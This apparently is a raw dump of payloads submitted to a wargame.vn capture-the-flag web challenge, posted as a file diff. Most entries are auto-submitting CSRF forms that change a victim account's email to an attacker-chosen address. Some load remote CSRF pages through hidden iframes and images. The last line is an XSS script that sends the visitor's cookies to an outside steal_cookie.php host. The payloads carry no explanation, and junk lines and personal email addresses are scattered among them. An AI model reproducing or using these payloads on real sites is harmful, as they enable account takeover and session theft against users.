+<form name=îbigayî action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" method=îPOSTî target=îhiddenî> 
+<input type=îhiddenî name=îemail" value=îsuoitien_2008@yahoo.comî> 
+<input type=îhiddenî name=confirm value=Change+Passwordî>
+</form> 
+<script>document.îbigayî.submit();</script> </iframe>
+
+<iframe style=îvisibility: hiddenî name=îlolî> 
+<form name=îbigayî action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" method=îPOSTî target=îhiddenî> 
+<input type=îhiddenî name=îemail" value=îhermec_98@yahoo.com.vnî> 
+<input type=îhiddenî name=confirm value=Change+Passwordî>
+</form> 
+<script>document.makePassword.submit();</script> </iframe>
+<html>
+<iframe style=îvisibility: hiddenî name=îlolî> 
+<form name=îbigayî action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" method=îPOSTî target=îhiddenî> 
+<input type=îhiddenî name=îemail" value=îsuoitien_2008@yahoo.comî> 
+<input type=îhiddenî name=confirm value=Change+Passwordî>
+</form> 
+<script>document.bigay.submit();</script> </iframe>
+</html>
+<html>
+ <FORM action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" METHOD="POST">
+<input type=îhiddenî name=îemail" value="hermec_98@yahoo.com.vn"> 
+<input type=îhiddenî name=confirm value="Change+Password">
+ </FORM>
+ <script>document.forms[0].submit();</script>
+</html>
+<html>
+ <FORM action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" METHOD="POST">
+<input type=îhiddenî name=îemail" value="hermec_98@yahoo.com.vn"> 
+<input type=îhiddenî name=confirm value="Change+Password">
+ </FORM>
+ <script>document.forms[0].submit();</script>
+</html>
+<html>
+ <FORM action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" method="POST"  target=îhiddenî>
+<input type=îhiddenî name=îemail" value="hermec_98@yahoo.com.vn"> 
+<input type=îhiddenî name="confirm" value="Change Email">
+ </FORM>
+ <script>document.forms[0].submit();</script>
+</html>
+
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+    <form name="badform" method="post" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change">
+		<input type=îhiddenî name="email" value="suoitien_2008@yahoo.com"> 
+		<input type=îhiddenî name="confirm" value="Change+Password">
+    </form>
+    <script type="text/javascript">
+        document.badform.submit();
+    </script>
+</body>
+</html>
+
+password=gaga&newpassword=gaga&email=pantez%40gmail.com&confirm=Change+Email
+Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!Feedback!
+<form name="myForm" id="myForm" target="_myFrame" 
+
+action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2
+
+dcd992c112bdb84b9a/?act=change" method="POST">
+    <p>
+        <li class="field"><input type="email" class="email 
+
+input" name="email" placeholder="Email" /></li>
+    </p>
+    <p>
+        <input type="submit" value="Submit" />
+    </p>
+</form>
+
+<script type="text/javascript">
+    window.onload=function(){
+        var auto = setTimeout(function(){ autoRefresh(); }, 
+
+100);
+
+        function submitform(){
+          alert('test');
+          document.forms["myForm"].submit();
+        }
+
+        function autoRefresh(){
+           clearTimeout(auto);
+           auto = setTimeout(function(){ submitform(); 
+
+autoRefresh(); }, 100);
+        }
+    }
+</script>
+asdf
+<form method="POST" action="?act=change" name="fuck">
+	<h3>EHLO, <font color='#f4902a'>knight9</font> :)</h3>
+	<li class="field"><input type="password" class="password input" name="password" placeholder="Old Password" /></li>
+	<li class="field"><input type="password" class="password input" name="newpassword" placeholder="New Password" /></li>
+	<li class="field"><input type="email" class="email input" name="email" placeholder="Email" value="loianhtuan@gmail.com"/></li>
+</form>
+<script>document.fuck.submit();</script>
+
+sdas
+<form method="POST" action="?act=change" name="fuck">
+	<h3>EHLO, <font color='#f4902a'>knight9</font> :)</h3>
+	<li class="field"><input type="password" class="password input" name="password" placeholder="Old Password" /></li>
+	<li class="field"><input type="password" class="password input" name="newpassword" placeholder="New Password" /></li>
+	<li class="field"><input type="email" class="email input" name="email" placeholder="Email" value="loianhtuan@gmail.com"/></li>
+	<li class="field"><input type="email" class="email input" name="confirm" value="Change Email"/></li>
+</form>
+<script>document.fuck.submit();</script>
+
+<form method="POST" action="?act=change" name="fuck">
+	<h3>EHLO, <font color='#f4902a'>knight9</font> :)</h3>
+	<li class="field"><input type="password" class="password input" name="password" placeholder="Old Password" /></li>
+	<li class="field"><input type="password" class="password input" name="newpassword" placeholder="New Password" /></li>
+	<li class="field"><input type="email" class="email input" name="email" placeholder="Email" value="loianhtuan@yahoo.com"/></li>
+	<li class="field"><input type="email" class="email input" name="confirm" value="Change Email"/></li>
+</form>
+<script>document.fuck.submit();</script>
+
+ads
+dsc
+nguyen duy duc
+s
+gsgd
+<form method="POST" action="?act=change" name="fuck">
+	<h3>EHLO, <font color='#f4902a'>knight9</font> :)</h3>
+	<li class="field"><input type="password" class="password input" name="password" placeholder="Old Password" /></li>
+	<li class="field"><input type="password" class="password input" name="newpassword" placeholder="New Password" /></li>
+	<li class="field"><input type="email" class="email input" name="email" placeholder="Email" value="loianhtuan@yahoo.com"/></li>
+	<li class="field"><input type="email" class="email input" name="confirm" value="Change Email"/></li>
+</form>
+<script>document.fuck.submit();</script>
+
+  <html>
+		
+		<form name="csrf" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" method="POST">
+  <input type="hidden" name="email" value="kaisai1@mailinator.com" />
+ <input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script type="text/javascript">
+document.forms["csrf"].submit();
+</script>
+<form name="csrf" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" method="POST">
+ <input type="hidden" name="email" value="pantez@gmail.com" />
+ <input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script type="text/javascript">
+document.forms["csrf"].submit();
+</script>
+<form name="csrf" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" method="POST">
+ 
+  <input type="hidden" name="email" value="lighter0012002@gmail.com" />
+ <input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script type="text/javascript">
+document.forms["csrf"].submit();
+</script>
+<form id="evil" name="evil" method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change">
+<input type="hidden" name="email" value="bolzano_1989%40yahoo.com" />
+<input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script>document.evil.submit()</script>
+<form id="evil" name="evil" method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change">
+<input type="hidden" name="email" value="bolzano_1989@yahoo.com" />
+<input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script>document.evil.submit()</script>
+<form id="evil" name="evil" method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change">
+<input type="hidden" name="email" value="bolzano_1989@yahoo.com" />
+<input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script type="text/javascript">document.evil.submit()</script>
+<form id="evil" name="evil" method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change">
+<input type="hidden" name="email" value="bolzano_1989@yahoo.com" />
+<input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script type="text/javascript">document.forms("evil").submit()</script>
+<form id="evil" name="evil" method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change">
+<input type="hidden" name="email" value="bolzano_1989@yahoo.com" />
+<input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script type="text/javascript">document.forms("evil").submit();</script>
+<form name="evil" method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change">
+<input type="hidden" name="email" value="bolzano_1989@yahoo.com" />
+<input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script type="text/javascript">document.forms("evil").submit();</script>
+<form name="evil" method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change"> <input type="hidden" name="email" value="bolzano_1989@yahoo.com" /> <input name="confirm" type="hidden" value="Change Email"/> </form>
+<script type="text/javascript">document.forms["evil"].submit();</script>
+<form method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" name="fuck">
+	<h3>EHLO, <font color='#f4902a'>knight9</font> :)</h3>
+	<li class="field"><input type="password" class="password input" name="password" placeholder="Old Password" /></li>
+	<li class="field"><input type="password" class="password input" name="newpassword" placeholder="New Password" /></li>
+	<li class="field"><input type="email" class="email input" name="email" placeholder="Email" value="loianhtuan@yahoo.com"/></li>
+	<li class="field"><input type="email" class="email input" name="confirm" value="Change Email"/></li>
+</form>
+<script>document.fuck.submit();</script>
+
+<form method="POST" action="?act=change" name="fuck2">
+	<h3>EHLO, <font color='#f4902a'>knight9</font> :)</h3>
+	<li class="field"><input type="password" class="password input" name="password" placeholder="Old Password" /></li>
+	<li class="field"><input type="password" class="password input" name="newpassword" placeholder="New Password" /></li>
+	<li class="field"><input type="email" class="email input" name="email" placeholder="Email" value="loianhtuan@yahoo.com"/></li>
+	<li class="field"><input type="email" class="email input" name="confirm" value="Forgot?"/></li>
+</form>
+<script>document.fuck2.submit();</script>
+admin%09
+flag?
+<iframe width="0" height="0" style="visibility: hidden;" 
+src="https://github.com/NamPNQ/utils/raw/master/csrf.html">
+<img width="0" height="0" src="https://github.com/NamPNQ/utils/raw/master/csrf.html">
+<img width="0" height="0" src="https://github.com/NamPNQ/utils/raw/master/csrf.html">
+<iframe src="http://pastehtml.com/view/dc41hlcxp.html"/>
+<iframe src="http://pastehtml.com/raw/dc41zxanh.html" />
+<iframe src="http://pastehtml.com/raw/dc42hwsu5.html"/>
+<img src="http://pastehtml.com/raw/dc42hwsu5.html" />
+<form name="csrf_form" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" method="POST">
+<input type="email" class="email input" name="email" placeholder="Email" value="a@yopmail.com">
+<input class="button button-orange" name="confirm" type="text" value="Change Email">
+</form>
+<script type="text/javascript">document.csrf_form.submit();</script>
+F33db4ck
+<script>document.location='http://kinhsao.com/steal_cookie.php?cookie='+document.cookie;</script>
